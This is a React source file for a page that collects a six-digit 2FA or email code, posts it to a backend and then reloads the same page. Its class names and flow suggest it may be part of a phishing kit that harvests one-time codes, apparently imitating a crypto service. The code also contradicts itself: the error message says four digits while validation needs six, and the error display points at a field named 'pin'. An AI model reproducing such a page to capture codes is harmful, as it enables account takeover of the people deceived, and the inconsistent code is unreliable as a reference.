import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import "../App.css";
import "../styles/otp.css";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import FormErrMsg from "../components/FormErrMsg";
import axios from "axios";
import BASE_URL from "../components/urls";
import logo from "../assets/logo.svg";

const schema = yup.object().shape({
  otp: yup
    .string()
    .matches(/^\d{6}$/, "OTP must be exactly 4 digits")
    .required("OTP is required"),
});

const Otp = () => {
  const navigate = useNavigate();
  const {
    register,
    reset,
    handleSubmit,
    setValue,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const [otp, setOtp] = useState(new Array(6).fill(""));
  const [loading, setLoading] = useState(false);

  const handleChange = (element, index) => {
    const value = element.value;
    if (!/^\d$/.test(value)) return;

    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);

    if (index < 5 && value !== "") {
      document.getElementById(`otp-${index + 1}`).focus();
    }

    setValue("otp", newOtp.join(""));
  };

  const submitForm = (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/otp`, data)
      .then((response) => {
        setOtp(new Array(6).fill("")); // Reset OTP array
        reset();
        console.log(response.data);
        navigate("/otp");
      })
      .catch((error) => {
        console.error("There was an error!", error);
      })
      .finally(() => {
        setLoading(false);
      });
  };

  return (
    <div className="otp">
      <div className="container">
        <div className="contentSec">
          <div className="logo">
            <img src={logo} alt="logo" />
            <div className="paxBtn">English</div>
          </div>
          <div className="title">Enter 2FA code or Email code</div>
          <div className="subText">
            Please enter the 6-digit code we've sent to your Email
          </div>
        </div>
        <div className="formSec">
          <div className="input">
            <form onSubmit={handleSubmit(submitForm)}>
              <div className="formPin">
                {otp.map((data, index) => (
                  <input
                    key={index}
                    id={`otp-${index}`}
                    type="password"
                    name="otp"
                    maxLength="1"
                    value={data}
                    onChange={(e) => handleChange(e.target, index)}
                    onFocus={(e) => e.target.select()}
                    className="pin-input"
                    inputMode="numeric"
                  />
                ))}
              </div>

              <FormErrMsg errors={errors} inputName="pin" />

              <div className="buttonOtpSec">
                <button type="submit" className="paxOtp" disabled={loading}>
                  {loading ? "Loading..." : "Next"}
                </button>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Otp;
